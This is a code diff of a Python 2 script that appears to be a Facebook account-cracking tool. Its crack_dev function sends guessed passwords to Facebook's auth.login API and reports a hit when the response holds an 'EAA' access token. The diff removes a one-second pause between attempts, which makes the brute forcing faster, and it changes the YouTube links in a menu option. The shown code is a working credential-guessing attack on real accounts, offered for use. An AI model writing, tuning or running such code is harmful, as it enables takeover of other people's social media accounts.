@@ -132,7 +132,7 @@ def crack_dev(iqbal):
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
                                         }
         respon = requests.get('https://b-api.facebook.com/method/auth.login', params=parameter)
-        time.sleep(1)
+      
         print '\033[91;1m {\033[97;1m'+str(c)+'\033[91;1m} \033[97;1m'+iqbal+ '\033[90;1m ==> '+pasw+ ' '
         if 'EAA' in respon.text:
             print "\n\033[96;1m {\033[97;1mSuc\033[96;1m}\033[96;1m",iqbal,"\033[97;1m|\033[96;1m",pasw,'\n'
@@ -299,9 +299,9 @@ if __name__=="__main__":
 
         elif pilih == '3':
             try:
-                subprocess.check_output(['am', 'start', 'https://youtu.be/y5mCEe387Dk'])
+                subprocess.check_output(['am', 'start', 'https://youtu.be/ZpLTqwmy7ck'])
             except KeyboardInterrupt:
-                psubprocess.check_output(['am', 'start', 'https://youtu.be/y5mCEe387Dk'])
+                psubprocess.check_output(['am', 'start', 'https://youtu.be/ZpLTqwmy7ck'])
             except WindowsError:
                 os.system('pro_dev.py' if os.name == 'nt' else 'python2 pro_dev.py')
 
